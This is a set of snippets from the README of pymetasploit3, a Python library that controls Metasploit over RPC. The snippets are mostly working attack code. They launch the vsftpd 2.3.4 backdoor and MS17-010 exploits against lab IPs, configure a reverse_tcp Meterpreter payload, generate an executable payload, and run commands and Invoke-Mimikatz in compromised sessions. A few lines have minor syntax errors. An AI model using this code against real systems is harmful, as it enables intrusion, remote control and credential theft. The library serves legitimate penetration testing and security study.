[
  {
    "owner": "danmcinerney",
    "repo": "pymetasploit3",
    "content": "TITLE: Configuring Exploit and Payload Options for Execution\nDESCRIPTION: Python code demonstrating how to configure both exploit and payload options before execution. This example targets MS17-010 vulnerability with a reverse TCP Meterpreter payload.\nSOURCE: https://github.com/danmcinerney/pymetasploit3/blob/master/README.md#2025-04-23_snippet_19\n\nLANGUAGE: python\nCODE:\n```\nexploit = client.modules.use('exploit', 'windows/smb/ms17_010_psexec')\nexploit['RHOSTS'] = '172.28.128.13'\npayload = client.modules.use('payload', 'windows/meterpreter/reverse_tcp')\npayload['LHOST'] = '172.28.128.1'\npayload['LPORT'] = 4444\nexploit.execute(payload=payload)\n```\n\n----------------------------------------\n\nTITLE: Executing an Exploit with Specified Payload\nDESCRIPTION: Python code to execute an exploit module with a specified payload. The response includes job information that can be used to track the attack.\nSOURCE: https://github.com/danmcinerney/pymetasploit3/blob/master/README.md#2025-04-23_snippet_10\n\nLANGUAGE: python\nCODE:\n```\n>>> exploit.execute(payload='cmd/unix/interact')\n{'job_id': 1, 'uuid': '3whbuevf'}\n>>>\n```\n\n----------------------------------------\n\nTITLE: Running a Module with Console Output\nDESCRIPTION: Python code to create a new console, run a module through it, and capture the complete output. This approach waits for the module execution to complete before returning results.\nSOURCE: https://github.com/danmcinerney/pymetasploit3/blob/master/README.md#2025-04-23_snippet_15\n\nLANGUAGE: python\nCODE:\n```\n>>> cid = client.consoles.console().cid # Create a new console and store its number in 'cid'\n>>> print(client.consoles.console(cid).run_module_with_output(exploit, payload='cmd/unix/interact'))\n# Some time passes\n'[*] 172.16.14.145:21 - Banner: 220 vsFTPd 2.3.4\n[*] 172.16.14.145:21 - USER: 331 Please specify the password\n...'\n```\n\n----------------------------------------\n\nTITLE: Creating an Exploit Module Object\nDESCRIPTION: Python code to instantiate an exploit module object for a specific vulnerability (vsftpd_234_backdoor). This allows for configuration and execution of the selected exploit.\nSOURCE: https://github.com/danmcinerney/pymetasploit3/blob/master/README.md#2025-04-23_snippet_6\n\nLANGUAGE: python\nCODE:\n```\n>>> exploit = client.modules.use('exploit', 'unix/ftp/vsftpd_234_backdoor')\n>>>\n```\n\n----------------------------------------\n\nTITLE: Configuring and Generating a Payload\nDESCRIPTION: Python code to set various options for a payload module and generate the executable payload. The options include encoding preferences, format, and platform settings.\nSOURCE: https://github.com/danmcinerney/pymetasploit3/blob/master/README.md#2025-04-23_snippet_13\n\nLANGUAGE: python\nCODE:\n```\n# set runoptions\npayload.runoptions['BadChars'] = ''\npayload.runoptions['Encoder'] = ''\npayload.runoptions['Format'] = 'exe\npayload.runoptions['NopSledSize'] = 0\npayload.runoptions['ForceEncode'] = False\n# payload.runoptions['Template'] = ''\npayload.runoptions['Platform'] = ''\n# payload.runoptions['KeepTemplateWorking'] = True\npayload.runoptions['Iterations'] = 0\n\ndata = payload.payload_generate()\nif isinstance(data, str):\n    print(data)\nelse:\n    with open('test.exe', 'wb') as f:\n        f.write(data)\n```\n\n----------------------------------------\n\nTITLE: Exploring Exploit Information\nDESCRIPTION: Python code to view detailed information about an exploit module, including its description, available options, and required parameters that have not yet been set.\nSOURCE: https://github.com/danmcinerney/pymetasploit3/blob/master/README.md#2025-04-23_snippet_7\n\nLANGUAGE: python\nCODE:\n```\n>>>  print(exploit.description)\n\n          This module exploits a malicious backdoor that was added to the\tVSFTPD download\n          archive. This backdoor was introduced into the vsftpd-2.3.4.tar.gz archive between\n          June 30th 2011 and July 1st 2011 according to the most recent information\n          available. This backdoor was removed on July 3rd 2011.\n\n>>> exploit.options\n['TCP::send_delay', 'ConnectTimeout', 'SSLVersion', 'VERBOSE', 'SSLCipher', 'CPORT', 'SSLVerifyMode', 'SSL', 'WfsDelay',\n'CHOST', 'ContextInformationFile', 'WORKSPACE', 'EnableContextEncoding', 'TCP::max_send_size', 'Proxies',\n'DisablePayloadHandler', 'RPORT', 'RHOSTS']\n>>> exploit.missing_required # Required options which haven't been set yet\n['RHOSTS']\n>>>\n```\n\n----------------------------------------\n\nTITLE: Viewing Available Payloads for Exploit\nDESCRIPTION: Python code to list all compatible payloads for a specific exploit module. This helps in selecting an appropriate payload for the target system.\nSOURCE: https://github.com/danmcinerney/pymetasploit3/blob/master/README.md#2025-04-23_snippet_9\n\nLANGUAGE: python\nCODE:\n```\n>>> exploit.targetpayloads()\n['cmd/unix/interact']\n>>>\n```\n\n----------------------------------------\n\nTITLE: Interacting with a Shell Session\nDESCRIPTION: Python code to create a shell object from an active session and interact with it by writing commands and reading responses. This demonstrates basic command execution on a compromised system.\nSOURCE: https://github.com/danmcinerney/pymetasploit3/blob/master/README.md#2025-04-23_snippet_14\n\nLANGUAGE: python\nCODE:\n```\n>>> shell = client.sessions.session('1')\n>>> shell.write('whoami')\n>>> print(shell.read())\nroot\n>>>\n```\n\n----------------------------------------\n\nTITLE: Running a Command with Output in a Session\nDESCRIPTION: Python code to run a command in a session and wait for it to complete by detecting specific output patterns. This allows for more controlled interaction with sessions.\nSOURCE: https://github.com/danmcinerney/pymetasploit3/blob/master/README.md#2025-04-23_snippet_16\n\nLANGUAGE: python\nCODE:\n```\n>>> session_id = '1'\n>>> session_command = 'arp'\n>>> terminating_strs = ['----']\n>>> client.sessions.session(session_id).run_with_output(session_command, terminating_strs)\n# Some time passes\n'\\nARP Table\\n                  ---------------\\n  ...`\n```\n\n----------------------------------------\n\nTITLE: Running a PowerShell Script in a Session\nDESCRIPTION: Python code to import and execute a PowerShell script (such as Invoke-Mimikatz) in an active session. This demonstrates advanced post-exploitation capabilities.\nSOURCE: https://github.com/danmcinerney/pymetasploit3/blob/master/README.md#2025-04-23_snippet_17\n\nLANGUAGE: python\nCODE:\n```\n>>> session_id = '1'\n>>> psh_script_path  = '/home/user/scripts/Invoke-Mimikatz.ps1'\n>>> session = c.sessions.session(sessions_id)\n>>> sessions.import_psh(psh_script_path)\n>>> sessions.run_psh_cmd('Invoke-Mimikatz')\n# Some time passes\n'Mimikatz output...'\n```\n\n----------------------------------------\n\nTITLE: Listing Active Sessions\nDESCRIPTION: Python code to list all active sessions established through successful exploits. The session information includes details about connections, exploit paths, and session types.\nSOURCE: https://github.com/danmcinerney/pymetasploit3/blob/master/README.md#2025-04-23_snippet_11\n\nLANGUAGE: python\nCODE:\n```\n>>> client.sessions.list\n{1: {'info': '', 'username': 'jsmith', 'session_port': 21, 'via_payload': 'payload/cmd/unix/interact',\n'uuid': '5orqnnyv', 'tunnel_local': '172.16.14.1:58429', 'via_exploit': 'exploit/unix/ftp/vsftpd_234_backdoor',\n'exploit_uuid': '3whbuevf', 'tunnel_peer': '172.16.14.145:6200', 'workspace': 'false', 'routes': '',\n'target_host': '172.16.14.145', 'type': 'shell', 'session_host': '172.16.14.145', 'desc': 'Command shell'}}\n>>>\n```\n\n----------------------------------------\n\nTITLE: Running a Command with Timeout in a Session\nDESCRIPTION: Python code to run a command in a session with a timeout parameter. This allows for handling long-running commands with the option to return partial results if the timeout expires.\nSOURCE: https://github.com/danmcinerney/pymetasploit3/blob/master/README.md#2025-04-23_snippet_18\n\nLANGUAGE: python\nCODE:\n```\n>>> session_id = '1'\n>>> session_command = 'arp'\n>>> terminating_strs = ['----']\n>>> client.sessions.session(session_id).run_with_output(session_command, terminating_strs, timeout=10, timeout_exception=False))\n# 10s pass\n'\\nARP Table\\n                  ---------------\\n  ...`\n```\n\n----------------------------------------\n\nTITLE: Exploring Available Exploit Modules\nDESCRIPTION: Python code to list all available exploit modules in the Metasploit framework. This provides an overview of exploits that can be used programmatically.\nSOURCE: https://github.com/danmcinerney/pymetasploit3/blob/master/README.md#2025-04-23_snippet_5\n\nLANGUAGE: python\nCODE:\n```\n>>> client.modules.exploits\n['windows/wins/ms04_045_wins', 'windows/winrm/winrm_script_exec', 'windows/vpn/safenet_ike_11',\n'windows/vnc/winvnc_http_get', 'windows/vnc/ultravnc_viewer_bof', 'windows/vnc/ultravnc_client', ...\n'aix/rpc_ttdbserverd_realpath', 'aix/rpc_cmsd_opcode21']\n>>>\n```\n\n----------------------------------------\n\nTITLE: Creating a Payload Module Object\nDESCRIPTION: Python code to instantiate a payload module object for a Windows Meterpreter reverse TCP connection. This allows for customization and generation of the payload.\nSOURCE: https://github.com/danmcinerney/pymetasploit3/blob/master/README.md#2025-04-23_snippet_12\n\nLANGUAGE: python\nCODE:\n```\npayload = client.modules.use('payload', 'windows/meterpreter/reverse_tcp')\n```\n\n----------------------------------------\n\nTITLE: Setting Exploit Target Host\nDESCRIPTION: Python code to set the RHOSTS parameter for an exploit module, specifying the target IP address for the attack.\nSOURCE: https://github.com/danmcinerney/pymetasploit3/blob/master/README.md#2025-04-23_snippet_8\n\nLANGUAGE: python\nCODE:\n```\n>>> exploit['RHOSTS'] = '172.16.14.145' # IP of our target host\n>>>\n```\n\n----------------------------------------\n\nTITLE: Connecting to Msfrpcd in Python\nDESCRIPTION: Python code to establish a connection to the Metasploit RPC daemon (msfrpcd) using the MsfRpcClient class. This enables programmatic control of Metasploit framework.\nSOURCE: https://github.com/danmcinerney/pymetasploit3/blob/master/README.md#2025-04-23_snippet_2\n\nLANGUAGE: python\nCODE:\n```\n>>> from pymetasploit3.msfrpc import MsfRpcClient\n>>> client = MsfRpcClient('yourpassword', ssl=True)\n```\n\n----------------------------------------\n\nTITLE: Connecting to Msfconsole with Msgrpc Plugin\nDESCRIPTION: Python code to connect to a running Metasploit console that has the msgrpc plugin loaded. This allows interaction with a currently running Metasploit instance.\nSOURCE: https://github.com/danmcinerney/pymetasploit3/blob/master/README.md#2025-04-23_snippet_3\n\nLANGUAGE: python\nCODE:\n```\n>>> from pymetasploit3.msfrpc import MsfRpcClient\n>>> client = MsfRpcClient('yourpassword', port=55552, True)\n```\n\n----------------------------------------\n\nTITLE: Exploring MsfRpcClient Methods\nDESCRIPTION: Python code demonstrating how to list available methods in the MsfRpcClient object. This provides an overview of the main components of the Metasploit framework that can be accessed programmatically.\nSOURCE: https://github.com/danmcinerney/pymetasploit3/blob/master/README.md#2025-04-23_snippet_4\n\nLANGUAGE: python\nCODE:\n```\n>>> [m for m in dir(client) if not m.startswith('_')]\n['auth', 'authenticated', 'call', 'client', 'consoles', 'core', 'db', 'jobs', 'login', 'logout', 'modules', 'plugins',\n'port', 'server', 'token', 'sessions', 'ssl', 'uri']\n>>>\n```\n\n----------------------------------------\n\nTITLE: Starting Metasploit RPC Server via Msfconsole\nDESCRIPTION: Command to start the Metasploit RPC server on port 55552 using msfconsole with the msgrpc plugin loaded. This enables remote API interaction while maintaining access to the console UI.\nSOURCE: https://github.com/danmcinerney/pymetasploit3/blob/master/README.md#2025-04-23_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\n$ msfconsole\nmsf> load msgrpc [Pass=yourpassword]\n```\n\n----------------------------------------\n\nTITLE: Starting Metasploit RPC Server via Msfrpcd\nDESCRIPTION: Command to start the dedicated Metasploit RPC server daemon on port 55553 in the background. This method runs only the RPC service without the console interface.\nSOURCE: https://github.com/danmcinerney/pymetasploit3/blob/master/README.md#2025-04-23_snippet_1\n\nLANGUAGE: bash\nCODE:\n```\n$ msfrpcd -P yourpassword \n```"
  }
]